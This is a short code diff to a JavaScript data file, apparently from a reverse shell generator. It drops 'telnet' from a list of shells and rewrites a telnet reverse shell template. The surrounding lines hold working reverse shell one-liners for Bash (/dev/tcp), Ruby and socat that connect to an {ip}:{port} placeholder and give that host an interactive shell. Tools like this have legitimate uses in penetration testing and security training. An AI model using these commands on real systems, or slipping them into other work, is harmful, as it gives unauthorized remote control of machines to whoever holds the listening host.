@@ -7,7 +7,7 @@ const rsgData = {
         ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}']
     ],
 
-    shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'telnet'],
+    shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
 
     reverseShellsCommands: [
         ['Bash #1', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
@@ -29,7 +29,7 @@ const rsgData = {
         ['Ruby #2', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
         ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
         ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
-        ['telnet #1', 'mknod a p && telnet {ip} {port} 0&#60;a | /bin/bash 1&#62;a'],
+        ['telnet', 'mknod a p && telnet {ip} {port} 0<a | /bin/{shell} 1>a']
     ],
 
     specialCommands: {
